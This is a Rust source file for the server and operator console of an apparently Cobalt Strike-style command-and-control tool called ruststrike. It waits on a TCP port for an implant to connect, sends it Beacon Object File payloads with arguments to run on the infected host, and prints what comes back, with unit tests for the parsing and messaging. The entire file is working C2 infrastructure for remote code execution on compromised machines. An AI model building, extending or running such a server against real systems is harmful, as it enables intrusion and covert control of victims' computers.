//! ruststrike-server: TCP listener + operator console.
//!
//! v1: accepts a single implant connection, then lets the operator type
//! commands on stdin (`hello`, `load <file> [args]`, `quit`) and prints any
//! output received from the implant.

use anyhow::{Context, Result};
use ruststrike_protocol::{encode_bof, ImplantMessage, ServerMessage};
use std::io::{BufRead, BufReader, BufWriter, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::mpsc;
use std::thread;

fn main() -> Result<()> {
    let port: u16 = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(4444);

    let listener = TcpListener::bind(("0.0.0.0", port))
        .with_context(|| format!("binding 0.0.0.0:{port}"))?;
    eprintln!("[server] listening on 0.0.0.0:{port}, waiting for implant...");

    let (stream, addr) = listener.accept().context("accepting implant")?;
    eprintln!("[server] implant connected from {addr}");

    let reader_stream = stream.try_clone().context("cloning stream")?;
    let writer_stream = stream;

    // The reader thread prints implant output to stdout the instant it arrives
    // (and also forwards to the channel for tests). This matters because the
    // main loop blocks on stdin: if printing happened only when the operator
    // typed a command, BOF output would appear stuck until the next keystroke.
    let (tx, _rx) = mpsc::channel::<String>();

    // Reader thread: implant -> console.
    thread::spawn(move || reader_loop(reader_stream, tx));

    let mut writer = BufWriter::new(writer_stream);

    let stdin = std::io::stdin();
    for line in stdin.lock().lines() {
        let line = match line {
            Ok(l) => l,
            Err(e) => {
                eprintln!("[server] stdin error: {e}");
                break;
            }
        };
        let cmd = line.trim();
        if cmd.is_empty() {
            continue;
        }
        if cmd == "quit" || cmd == "exit" {
            break;
        }
        let msg = match parse_command(cmd) {
            Some(m) => m,
            None => {
                eprintln!("[server] unknown command: {cmd:?}");
                eprintln!("  commands: hello | load <bof.o> [text args...] | loadb <bof.o> <args.bin> | quit");
                continue;
            }
        };
        match &msg {
            ServerMessage::Hello => {
                if send(&mut writer, &msg).is_err() {
                    eprintln!("[server] failed to send hello; implant may be gone");
                }
            }
            ServerMessage::Bof { .. } => {
                if let Err(e) = send(&mut writer, &msg) {
                    eprintln!("[server] failed to send bof: {e}");
                }
            }
        }
        // Output is printed live by the reader thread; nothing to drain here.
    }

    eprintln!("[server] bye.");
    Ok(())
}

fn parse_command(cmd: &str) -> Option<ServerMessage> {
    let mut parts = cmd.split_whitespace();
    match parts.next()? {
        "hello" => Some(ServerMessage::Hello),
        "load" => {
            // `load <bof.o> [text args...]` — args is treated as a UTF-8 string
            // (works for BOFs that parse args as plain text). The bytes are
            // base64-encoded for transport.
            let path = parts.next()?;
            let args = parts.collect::<Vec<_>>().join(" ");
            let bytes = std::fs::read(path).ok()?;
            Some(ServerMessage::Bof {
                file: encode_bof(&bytes),
                args: encode_bof(args.as_bytes()),
            })
        }
        "loadb" => {
            // `loadb <bof.o> <args.bin>` — load a BOF with a raw binary argument
            // buffer (the CS/AdaptixC2 packed format) read from a file. Use this
            // for BOFs whose `go()` walks args via BeaconDataExtract/Int.
            let mut rest = parts;
            let path = rest.next()?;
            let args_path = rest.next()?;
            let bytes = std::fs::read(path).ok()?;
            let args_bytes = std::fs::read(args_path).unwrap_or_default();
            Some(ServerMessage::Bof {
                file: encode_bof(&bytes),
                args: encode_bof(&args_bytes),
            })
        }
        _ => None,
    }
}

fn send(writer: &mut BufWriter<TcpStream>, msg: &ServerMessage) -> Result<()> {
    writer.write_all(msg.to_json().as_bytes())?;
    writer.write_all(b"\n")?;
    writer.flush()?;
    Ok(())
}

fn reader_loop(stream: TcpStream, tx: mpsc::Sender<String>) {
    let mut reader = BufReader::new(stream);
    let stdout = std::io::stdout();
    let mut line = String::new();
    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => {
                print_line(&stdout, "[server] implant disconnected", &tx);
                break;
            }
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                match serde_json::from_str::<ImplantMessage>(trimmed) {
                    Ok(ImplantMessage::Hello { data }) => {
                        print_line(&stdout, &format!("[implant] hello: {data}"), &tx);
                    }
                    Ok(ImplantMessage::Output { data }) => {
                        print_line(&stdout, &format!("[implant] output: {data}"), &tx);
                    }
                    Ok(ImplantMessage::Error { data }) => {
                        print_line(&stdout, &format!("[implant] error: {data}"), &tx);
                    }
                    Err(e) => {
                        print_line(&stdout, &format!("[server] unparseable line ({e}): {trimmed}"), &tx);
                    }
                }
            }
            Err(e) => {
                print_line(&stdout, &format!("[server] read error: {e}"), &tx);
                break;
            }
        }
    }
}

/// Print `msg` to stdout immediately (flushed) and forward it to the test
/// channel. The direct print is what makes live output appear without waiting
/// for operator input; the channel keeps the unit tests working.
fn print_line(stdout: &std::io::Stdout, msg: &str, tx: &mpsc::Sender<String>) {
    let _ = tx.send(msg.to_string());
    let mut h = stdout.lock();
    let _ = writeln!(h, "{msg}");
    let _ = h.flush();
}

#[cfg(test)]
mod tests {
    use super::*;
    use ruststrike_protocol::decode_bof;
    use std::io::Cursor;

    #[test]
    fn hello_command_serializes() {
        let m = parse_command("hello").unwrap();
        let s = m.to_json();
        assert!(s.contains("\"type\":\"hello\""));
    }

    #[test]
    fn load_command_packages_bytes() {
        // Write a temp file with known bytes, ensure `load` base64-encodes both
        // the COFF and the text args.
        let tmp = std::env::temp_dir().join("ruststrike_load_test.bin");
        let raw = vec![0xDE, 0xAD, 0xBE, 0xEF];
        std::fs::write(&tmp, &raw).unwrap();
        let cmd = format!("load {} some args", tmp.to_str().unwrap());
        let m = parse_command(&cmd).expect("parse");
        match m {
            ServerMessage::Bof { file, args } => {
                assert_eq!(decode_bof(&file).unwrap(), raw);
                assert_eq!(decode_bof(&args).unwrap(), b"some args");
            }
            _ => panic!("expected bof"),
        }
        let _ = std::fs::remove_file(&tmp);
    }

    #[test]
    fn loadb_command_packages_binary_args() {
        // `loadb` reads binary args from a file and base64-encodes them verbatim.
        let bof_tmp = std::env::temp_dir().join("ruststrike_loadb_bof.bin");
        let args_tmp = std::env::temp_dir().join("ruststrike_loadb_args.bin");
        let bof_raw = vec![0xDE, 0xAD, 0xBE, 0xEF];
        let args_raw = vec![0x00, 0x00, 0x00, 0x09, b'1', b'2', b'7', b'.', b'0', b'.', b'0', b'.', b'1'];
        std::fs::write(&bof_tmp, &bof_raw).unwrap();
        std::fs::write(&args_tmp, &args_raw).unwrap();
        let cmd = format!("loadb {} {}", bof_tmp.to_str().unwrap(), args_tmp.to_str().unwrap());
        let m = parse_command(&cmd).expect("parse");
        match m {
            ServerMessage::Bof { file, args } => {
                assert_eq!(decode_bof(&file).unwrap(), bof_raw);
                assert_eq!(decode_bof(&args).unwrap(), args_raw);
            }
            _ => panic!("expected bof"),
        }
        let _ = std::fs::remove_file(&bof_tmp);
        let _ = std::fs::remove_file(&args_tmp);
    }

    #[test]
    fn reader_loop_parses_output() {
        // Simulate implant sending an output line.
        let srv = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = srv.local_addr().unwrap();
        let (tx, rx) = mpsc::channel();
        let handle = thread::spawn(move || {
            let (stream, _) = srv.accept().unwrap();
            reader_loop(stream, tx);
        });
        let mut client = std::net::TcpStream::connect(addr).unwrap();
        writeln!(client, "{}", ImplantMessage::Output { data: "hi".into() }.to_json()).unwrap();
        client.flush().unwrap();
        drop(client);
        let _ = handle.join();
        let msg = rx.recv().unwrap();
        assert!(msg.contains("[implant] output: hi"), "got: {msg}");
    }

    #[test]
    fn reader_loop_parses_hello() {
        let srv = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = srv.local_addr().unwrap();
        let (tx, rx) = mpsc::channel();
        let handle = thread::spawn(move || {
            let (stream, _) = srv.accept().unwrap();
            reader_loop(stream, tx);
        });
        let mut client = std::net::TcpStream::connect(addr).unwrap();
        writeln!(client, "{}", ImplantMessage::Hello { data: "from implant".into() }.to_json()).unwrap();
        client.flush().unwrap();
        drop(client);
        let _ = handle.join();
        let msg = rx.recv().unwrap();
        assert!(msg.contains("hello: from implant"), "got: {msg}");
        let _ = Cursor::new(b"" as &[u8]); // silence unused import in some cfgs
    }
}
